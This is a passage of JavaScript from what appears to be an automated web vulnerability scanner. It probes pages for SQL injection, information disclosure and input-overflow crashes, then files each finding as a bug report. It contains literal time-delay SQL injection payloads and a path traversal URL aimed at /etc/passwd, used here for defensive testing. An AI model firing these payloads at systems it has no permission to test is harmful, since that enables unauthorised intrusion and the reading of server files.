          for (const pattern of SQL_ERROR_PATTERNS) {
            if (pattern.test(responseContent) && !pattern.test(baselineContent)) {
              bugs.push(makeBug(
                'critical',
                'SQL injection via URL parameter',
                'sec_sqli_url',
                `SQL error exposed when injecting payload via URL parameter.\n\nPayload: ${payload}\nTest URL: ${testUrl}`,
                ['Navigate to ' + testUrl, 'Observe SQL error in response'],
                'URL parameters should be parameterized in SQL queries',
                'SQL error message visible from URL parameter injection',
                testUrl
              ));
              broadcast({ type: 'log', text: 'CRITICAL: SQLi via URL parameter!', color: '#FF2D2D' });
              sqliFound = true;
              break;
            }
          }
          if (sqliFound) break;
        } catch (e) {
          // Continue
        }
      }
    }

    // ── Phase 6: Time-based blind SQLi detection ─────────────────────────────
    if (!sqliFound) {
      broadcast({ type: 'log', text: 'Testing time-based blind SQL injection...', color: '#4ECDC4' });

      // Measure baseline response time
      const baselineStart = Date.now();
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 15000 });
      const baselineTime = Date.now() - baselineStart;

      const timePayloads = [
        "' OR SLEEP(3)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' OR pg_sleep(3)--",
      ];

      for (const payload of timePayloads) {
        try {
          const encodedPayload = encodeURIComponent(payload);
          const testUrl = url.includes('?')
            ? `${url}&q=${encodedPayload}`
            : `${url}?q=${encodedPayload}`;

          const start = Date.now();
          await page.goto(testUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
          const elapsed = Date.now() - start;

          // If response is significantly slower than baseline (2.5s+ more), possible time-based blind SQLi
          if (elapsed - baselineTime > 2500) {
            bugs.push(makeBug(
              'high',
              'Potential time-based blind SQL injection',
              'sec_sqli_time',
              `Response time significantly increased with time-delay SQL payload, suggesting the SLEEP/WAITFOR command executed.\n\nBaseline: ${baselineTime}ms\nWith payload: ${elapsed}ms\nDifference: ${elapsed - baselineTime}ms\nPayload: ${payload}`,
              ['Navigate to ' + testUrl, 'Measure response time', 'Compare with baseline response time'],
              'SQL time-delay functions should not execute from user input',
              `Response delayed by ${elapsed - baselineTime}ms vs baseline`,
              testUrl
            ));
            broadcast({ type: 'log', text: 'Potential time-based blind SQLi detected!', color: '#FF6B35' });
            break;
          }
        } catch (e) {
          // Timeout could also indicate success
          if (e.message && e.message.includes('timeout')) {
            bugs.push(makeBug(
              'high',
              'Possible time-based blind SQL injection (timeout)',
              'sec_sqli_time',
              `Request timed out with time-delay SQL payload, which may indicate the delay function executed.\n\nPayload: ${payload}`,
              ['Navigate to URL with payload', 'Observe request timeout'],
              'SQL time-delay functions should not execute from user input',
              'Request timed out, suggesting SQL delay executed',
              url
            ));
          }
        }
      }
    }

    // ── Phase 7: Information disclosure in error pages ────────────────────────
    broadcast({ type: 'log', text: 'Checking for information disclosure in error responses...', color: '#4ECDC4' });

    try {
      const errorUrls = [
        url + '/nonexistent-page-' + Date.now(),
        url + '/%00',
        url + '/..%2F..%2F..%2Fetc%2Fpasswd',
      ];

      for (const errorUrl of errorUrls) {
        try {
          const resp = await page.goto(errorUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
          const content = await page.content();

          const disclosurePatterns = [
            { pattern: /apache\/[\d.]+/i, info: 'Apache version' },
            { pattern: /nginx\/[\d.]+/i, info: 'Nginx version' },
            { pattern: /iis\/[\d.]+/i, info: 'IIS version' },
            { pattern: /php\/[\d.]+/i, info: 'PHP version' },
            { pattern: /x-powered-by:\s*[\w.]+/i, info: 'X-Powered-By' },
            { pattern: /\/var\/www/i, info: 'Server file path' },
            { pattern: /c:\\\\(?:inetpub|www)/i, info: 'Windows server path' },
            { pattern: /stack trace/i, info: 'Stack trace' },
            { pattern: /Traceback/i, info: 'Python traceback' },
            { pattern: /at\s+\w+\.\w+\(.*?:\d+:\d+\)/i, info: 'JavaScript stack trace' },
          ];

          const foundDisclosures = [];
          for (const { pattern, info } of disclosurePatterns) {
            if (pattern.test(content)) {
              foundDisclosures.push(info);
            }
          }

          // Also check response headers
          if (resp) {
            const respHeaders = resp.headers();
            if (respHeaders['server'] && /[\d.]+/.test(respHeaders['server'])) {
              foundDisclosures.push(`Server header: ${respHeaders['server']}`);
            }
            if (respHeaders['x-powered-by']) {
              foundDisclosures.push(`X-Powered-By: ${respHeaders['x-powered-by']}`);
            }
          }

          if (foundDisclosures.length > 0) {
            bugs.push(makeBug(
              'medium',
              `Information disclosure in error response (${foundDisclosures.length} items)`,
              'sec_sqli_disclosure',
              `Error page reveals server information that could aid attackers:\n- ${foundDisclosures.join('\n- ')}`,
              ['Navigate to ' + errorUrl, 'Inspect response body and headers'],
              'Error pages should not reveal server versions, paths, or stack traces',
              `${foundDisclosures.length} information disclosure(s) found`,
              errorUrl
            ));
            broadcast({ type: 'log', text: `Information disclosure found: ${foundDisclosures.join(', ')}`, color: '#FF6B35' });
            break; // One bug is enough
          }
        } catch (e) {
          // Continue
        }
      }
    } catch (e) {
      // Non-critical
    }

    // ── Phase 8: Test numeric input type coercion ────────────────────────────
    if (!sqliFound) {
      broadcast({ type: 'log', text: 'Testing numeric type coercion...', color: '#4ECDC4' });

      const numericInputs = await page.$$('input[type="number"]');
      for (const numInput of numericInputs.slice(0, 3)) {
        try {
          // Numeric inputs reject text, so set value via JS
          for (const payload of SQLI_PAYLOADS_NUMERIC) {
            await numInput.evaluate((el, p) => { el.value = p; }, payload);
            await page.keyboard.press('Enter').catch(() => {});
            await page.waitForTimeout(500);

            const content = await page.content();
            for (const pattern of SQL_ERROR_PATTERNS) {
              if (pattern.test(content) && !pattern.test(baselineContent)) {
                bugs.push(makeBug(
                  'high',
                  'SQL injection via numeric input type coercion',
                  'sec_sqli_numeric',
                  `Numeric input field accepted arithmetic/SQL expression and produced SQL error.\n\nPayload: ${payload}`,
                  ['Navigate to ' + url, 'Modify numeric input value to: ' + payload, 'Submit form'],
                  'Numeric inputs should be strictly validated server-side',
                  'SQL error from numeric input manipulation',
                  url
                ));
                sqliFound = true;
                break;
              }
            }
            if (sqliFound) break;
          }
        } catch (e) {
          // Continue
        }
        if (sqliFound) break;
      }
    }

    if (!sqliFound && errorBugsCount === 0) {
      broadcast({ type: 'log', text: 'No SQL injection vulnerabilities detected', color: '#4ECDC4' });
    }
  } catch (error) {
    broadcast({ type: 'log', text: `SQLi test error: ${error.message}`, color: '#FF6B35' });
  }

  return bugs;
}

// ── Input Overflow & Fuzzing Test ─────────────────────────────────────────────

async function runSecOverflow(page, url, options, broadcast) {
  const bugs = [];
  const timeoutMs = (options.timeout || 30) * 1000;

  broadcast({ type: 'log', text: `Testing input overflow & fuzzing (${OVERFLOW_PAYLOADS.length} payloads)...`, color: '#4ECDC4' });

  try {
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: timeoutMs });

    const inputs = await page.$$('input, textarea, [contenteditable="true"]');
    broadcast({ type: 'log', text: `Testing ${Math.min(inputs.length, 5)} inputs for overflow/fuzzing`, color: '#4ECDC4' });

    let crashCount = 0;
    let errorCount = 0;
    let hangCount = 0;

    for (const input of inputs.slice(0, 5)) {
      // Get input type for context
      const inputInfo = await input.evaluate(el => ({
        tag: el.tagName.toLowerCase(),
        type: el.type || 'text',
        name: el.name || el.id || 'unknown',
        maxLength: el.maxLength || -1,
      })).catch(() => ({ tag: 'input', type: 'text', name: 'unknown', maxLength: -1 }));

      for (const { name, value } of OVERFLOW_PAYLOADS) {
        try {
          const beforeUrl = page.url();
          const startTime = Date.now();

          await input.click({ timeout: 2000 }).catch(() => {});
          await page.keyboard.selectAll();

          // Fill based on input type and payload size
          if (value.length > 5000) {
            // Use fill() for very long strings to avoid slow typing
            try {
              await input.fill(value.slice(0, 5000));
            } catch (fillErr) {
              // Some elements don't support fill, try evaluate
              await input.evaluate((el, v) => {
                if (el.contentEditable === 'true') el.textContent = v;
                else el.value = v;
              }, value.slice(0, 5000)).catch(() => {});
            }
          } else if (value.length > 500) {
            try {
              await input.fill(value);
            } catch (fillErr) {
              await input.evaluate((el, v) => {
                if (el.contentEditable === 'true') el.textContent = v;
                else el.value = v;
              }, value).catch(() => {});
            }
          } else {
            await page.keyboard.type(value, { delay: 2 });
          }

          await page.waitForTimeout(200);

          // Try submitting
          await page.keyboard.press('Enter').catch(() => {});

          // Wait with hang detection (10s max)
          const hangTimeout = 10000;
          const waitStart = Date.now();
          try {
            await page.waitForTimeout(Math.min(1000, hangTimeout));
          } catch (e) {
            // Ignore
          }

          const elapsed = Date.now() - startTime;

          // Check for hang (> 10 seconds)
          if (elapsed > hangTimeout) {
            hangCount++;
            bugs.push(makeBug(
              'high',
              `Page hang with ${name} (${inputInfo.name})`,
              'sec_overflow',
              `Page became unresponsive for ${(elapsed / 1000).toFixed(1)}s when processing "${name}" in ${inputInfo.tag}[${inputInfo.type}] "${inputInfo.name}".`,
              ['Navigate to ' + url, `Enter "${name}" payload in ${inputInfo.name}`, 'Observe page responsiveness'],
              'Page should remain responsive with any input',
              `Page hung for ${(elapsed / 1000).toFixed(1)} seconds`,
              url
            ));
            broadcast({ type: 'log', text: `Page hang with ${name}`, color: '#FF6B35' });
          }

          // Check for error indicators in content
          const content = await page.content();
          const lowerContent = content.toLowerCase();

          const errorIndicators = [
            { pattern: 'internal server error', severity: 'high', label: '500 Internal Server Error' },
            { pattern: '500', severity: 'medium', label: '500 status code' },
            { pattern: 'exception', severity: 'medium', label: 'Exception' },
            { pattern: 'stack trace', severity: 'high', label: 'Stack trace exposed' },
            { pattern: 'fatal error', severity: 'high', label: 'Fatal error' },
            { pattern: 'segmentation fault', severity: 'critical', label: 'Segmentation fault' },
            { pattern: 'buffer overflow', severity: 'critical', label: 'Buffer overflow' },
            { pattern: 'out of memory', severity: 'high', label: 'Out of memory' },
            { pattern: 'heap', severity: 'medium', label: 'Heap error' },
            { pattern: 'core dump', severity: 'critical', label: 'Core dump' },
          ];

          // Only check for new errors not in baseline
          for (const { pattern, severity, label } of errorIndicators) {
            if (lowerContent.includes(pattern)) {
              // Quick baseline check - reload and see if error was already there
              const baseCheck = await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 })
                .then(() => page.content())
                .then(c => c.toLowerCase().includes(pattern))
                .catch(() => false);

              if (!baseCheck) {
                errorCount++;
                bugs.push(makeBug(
                  severity,
                  `${label} with ${name} (${inputInfo.name})`,
                  'sec_overflow',
                  `Application showed "${label}" when handling "${name}" input in ${inputInfo.tag}[${inputInfo.type}] "${inputInfo.name}".`,
                  ['Navigate to ' + url, `Enter "${name}" payload in ${inputInfo.name}`, 'Submit or trigger processing'],
                  'Graceful handling of malformed input with user-friendly error message',
                  `${label} occurred`,
                  url
                ));
                broadcast({ type: 'log', text: `${label} with ${name}`, color: '#FF6B35' });
                break; // One error per input per payload is enough
              }
            }
          }

          // Check for console errors (JS exceptions)
          const jsErrors = [];
          const errorListener = (msg) => {
            if (msg.type() === 'error') jsErrors.push(msg.text());
          };
          page.on('console', errorListener);
          await page.waitForTimeout(200);
          page.off('console', errorListener);

          if (jsErrors.length > 0) {
            const jsErrorText = jsErrors.slice(0, 3).join('; ');
            if (jsErrorText.includes('RangeError') || jsErrorText.includes('Maximum call stack') || jsErrorText.includes('out of memory')) {
              bugs.push(makeBug(
                'medium',
                `JavaScript error with ${name}`,
                'sec_overflow',
                `Client-side JavaScript threw critical error with "${name}" input: ${jsErrorText}`,
                ['Navigate to ' + url, `Enter "${name}" payload`, 'Open DevTools console'],
                'Application should handle edge-case inputs without JS errors',
                `JS error: ${jsErrorText.substring(0, 200)}`,
                url
              ));
            }
          }

          // Reset page for next payload
          await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
        } catch (e) {
          if (e.message && (e.message.includes('crash') || e.message.includes('Target closed') || e.message.includes('Session closed'))) {
            crashCount++;
            bugs.push(makeBug(
              'critical',
              `Page crash with ${name} (${inputInfo.name})`,
              'sec_overflow',
              `Page/browser crashed when handling "${name}" input in ${inputInfo.tag}[${inputInfo.type}] "${inputInfo.name}". Error: ${e.message}`,
              ['Navigate to ' + url, `Enter "${name}" payload in ${inputInfo.name}`],
              'Page should handle input gracefully without crashing',
              'Page crashed',
              url
            ));
            broadcast({ type: 'log', text: `Page crash with ${name}`, color: '#FF2D2D' });

            // Try to recover
            try {
              await page.goto(url, { waitUntil: 'domcontentloaded', timeout: timeoutMs });
            } catch (recoverErr) {
              broadcast({ type: 'log', text: 'Could not recover page after crash, stopping overflow test', color: '#FF2D2D' });
              return bugs;
            }
          } else {
            // Non-crash error, try to reset
            try {
              await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 });
            } catch (_) {
              // Ignore
            }
          }
        }
      }
    }

    // ── Check Content-Type on API-like responses ─────────────────────────────
    broadcast({ type: 'log', text: 'Checking Content-Type headers on responses...', color: '#4ECDC4' });

    try {
      // Look for API endpoints referenced in the page
      const apiEndpoints = await page.evaluate(() => {
        const scripts = document.querySelectorAll('script');
        const endpoints = [];
        const urlPattern = /(?:fetch|axios|XMLHttpRequest|\.get|\.post|\.put|\.delete)\s*\(\s*['"`]([^'"`]+)['"`]/g;
        for (const script of scripts) {
          const text = script.textContent || '';
          let match;
          while ((match = urlPattern.exec(text)) !== null) {
            endpoints.push(match[1]);
          }
        }
        return endpoints.slice(0, 5);
      });

      for (const endpoint of apiEndpoints) {
        try {
          const fullUrl = endpoint.startsWith('http') ? endpoint : new URL(endpoint, url).href;
          const resp = await page.goto(fullUrl, { waitUntil: 'domcontentloaded', timeout: 5000 });
          if (resp) {
            const contentType = resp.headers()['content-type'] || '';
            if (contentType.includes('text/html') && !contentType.includes('json')) {
              // Check if response looks like JSON
              const body = await resp.text().catch(() => '');
              if (body.trim().startsWith('{') || body.trim().startsWith('[')) {
                bugs.push(makeBug(
                  'low',
                  'API endpoint returns text/html Content-Type for JSON data',
                  'sec_overflow_contenttype',
                  `Endpoint ${endpoint} returns JSON data but with text/html Content-Type. This can enable XSS via content sniffing.`,
                  ['Request ' + fullUrl, 'Check Content-Type header'],
                  'API endpoints should return application/json Content-Type',
                  `Content-Type: ${contentType}`,
                  fullUrl
                ));
              }
            }
          }
        } catch (e) {
          // Continue
        }
      }

      // Navigate back to test URL
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
    } catch (e) {
      // Non-critical
    }

    // ── Memory spike detection (compare JS heap) ─────────────────────────────
    broadcast({ type: 'log', text: 'Checking for memory issues...', color: '#4ECDC4' });

    try {
      const memBefore = await page.evaluate(() => {
        if (performance.memory) {
          return { usedJSHeapSize: performance.memory.usedJSHeapSize, totalJSHeapSize: performance.memory.totalJSHeapSize };
        }
        return null;
      });

      if (memBefore) {
        // Inject a large payload and check memory
        const bigPayload = 'X'.repeat(100000);
        const firstInput = await page.$('input, textarea');
        if (firstInput) {
          for (let i = 0; i < 10; i++) {
            await firstInput.fill(bigPayload).catch(() => {});
            await firstInput.fill('').catch(() => {});
          }

          const memAfter = await page.evaluate(() => {
            if (performance.memory) {
              return { usedJSHeapSize: performance.memory.usedJSHeapSize, totalJSHeapSize: performance.memory.totalJSHeapSize };
            }
            return null;
          });

          if (memAfter && memBefore) {
            const heapGrowthMB = (memAfter.usedJSHeapSize - memBefore.usedJSHeapSize) / (1024 * 1024);
            if (heapGrowthMB > 50) {
              bugs.push(makeBug(
                'high',
                `Excessive memory growth: ${heapGrowthMB.toFixed(1)}MB`,
                'sec_overflow_memory',
                `JS heap grew by ${heapGrowthMB.toFixed(1)}MB after repeated large input operations, suggesting a memory leak.\n\nBefore: ${(memBefore.usedJSHeapSize / (1024 * 1024)).toFixed(1)}MB\nAfter: ${(memAfter.usedJSHeapSize / (1024 * 1024)).toFixed(1)}MB`,
                ['Navigate to ' + url, 'Repeatedly enter and clear large input values', 'Monitor JS heap in DevTools'],
                'Memory should be released when input is cleared',
                `Heap grew by ${heapGrowthMB.toFixed(1)}MB`,
                url
              ));
            }
          }
        }
      }
    } catch (e) {
      // performance.memory is Chrome-only, non-critical
    }

    broadcast({
      type: 'log',
      text: `Overflow testing complete. Crashes: ${crashCount}, Errors: ${errorCount}, Hangs: ${hangCount}`,
      color: crashCount > 0 ? '#FF2D2D' : errorCount > 0 ? '#FF6B35' : '#4ECDC4'
    });
  } catch (error) {
    broadcast({ type: 'log', text: `Overflow test error: ${error.message}`, color: '#FF6B35' });
  }

  return bugs;
}

module.exports = { runSecXss, runSecSqli, runSecOverflow };
